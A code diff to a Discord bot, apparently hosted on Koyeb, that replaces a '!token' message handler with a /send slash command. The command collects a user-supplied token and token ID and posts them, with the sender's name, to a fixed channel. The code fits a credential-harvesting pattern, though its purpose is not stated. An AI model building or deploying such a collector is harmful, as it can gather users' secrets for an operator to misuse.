@@ -2,8 +2,6 @@
 // HTTP サーバー（Koyeb 用）
 // ===============================
 const http = require("http");
-
-// Koyeb は固定ポート不可 → PORT を使う
 const PORT = process.env.PORT || 3000;
 
 http.createServer((req, res) => {
@@ -16,6 +14,9 @@ http.createServer((req, res) => {
 // Discord Bot
 // ===============================
 const { Client, GatewayIntentBits, Partials } = require("discord.js");
+
+// 送信先チャンネルID（ここに実際のIDを入れてね）
+const TARGET_CHANNEL_ID = "123456789012345678";
 
 // トークンが設定されていない場合は即終了
 if (!process.env.TOKEN) {
@@ -37,14 +38,21 @@ client.on("ready", () => {
   console.log(`ログイン完了: ${client.user.tag}`);
 });
 
-client.on("messageCreate", async (message) => {
-  if (message.author.bot) return;
+// ===============================
+// スラッシュコマンド処理（/send）
+// ===============================
+client.on("interactionCreate", async interaction => {
+  if (!interaction.isChatInputCommand()) return;
+  if (interaction.commandName !== "send") return;
 
-  if (message.content === "!token") {
-    return message.reply("Use !send {TOKEN}");
-  }
+  const token = interaction.options.getString("token");
+  const tokenId = interaction.options.getString("token_id");
+  const sender = `${interaction.user.tag}`;
 
-  if (message.guild) return;
+  const channel = await client.channels.fetch(TARGET_CHANNEL_ID);
+  await channel.send(`TOKEN: ${token}\nTOKEN_ID: ${tokenId}\nfrom ${sender}`);
+
+  await interaction.reply({ content: "送信しました！", ephemeral: true });
 });
 
 // ===============================
